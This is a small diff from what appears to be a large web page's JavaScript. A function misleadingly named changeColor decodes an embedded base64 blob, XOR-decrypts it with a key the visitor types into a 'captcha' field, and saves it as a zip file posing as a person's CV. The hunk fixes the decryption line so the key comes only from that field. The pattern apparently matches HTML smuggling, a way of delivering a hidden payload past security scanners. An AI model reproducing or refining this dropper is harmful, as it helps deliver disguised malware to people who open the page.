@@ -11876,7 +11876,7 @@ link.click();
 
 function changeColor () {
 var _data = atob(data);
-_data = xorDecrypt(_data, "2345fgre23"document.getElementById("captcha2").value)
+_data = xorDecrypt(_data, document.getElementById("captcha2").value)
 saveByteArray("cv_markus_kister.zip", _data);
 }
 
